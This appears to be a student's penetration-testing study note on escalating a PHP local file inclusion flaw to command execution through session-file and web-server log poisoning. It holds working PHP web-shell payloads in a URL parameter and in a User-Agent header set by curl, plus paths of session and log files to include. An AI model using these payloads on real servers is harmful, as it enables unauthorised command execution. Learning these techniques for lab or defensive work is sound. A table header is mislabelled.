# PHP Session 

Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.

session cookies are stored in: `/var/lib/php/sessions/` or `C:\Windows\Temp\`

filename of cookie will be `sess_` + PHPSESS cookie

here we can access our attribute - for example what page we are at


using that, we can also try to modify the value 

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
this would change the page that we are at to session_poisoning instead of whatever language page we are at

then we can use a payload here: 
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

then we can nagivate to the cookie file in the url and add
```
&cmd=id
```

# Server Log Poisioning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`

we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

|         | Apache                  | Linux             |
| ------- | ----------------------- | ----------------- |
| Windows | `C:\xampp\apache\logs\` | `C:\nginx\log\`   |
| LInux   | `/var/log/apache2/`     | `/var/log/nginx/` |
use Burp Suite to intercept request and change the User-Agent to `<?php system($_GET['cmd']); ?>`

or use curl
```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison

curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

then we nagivate here 
```
/index.php?language=/var/log/apache2/access.log&cmd=id
```

service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`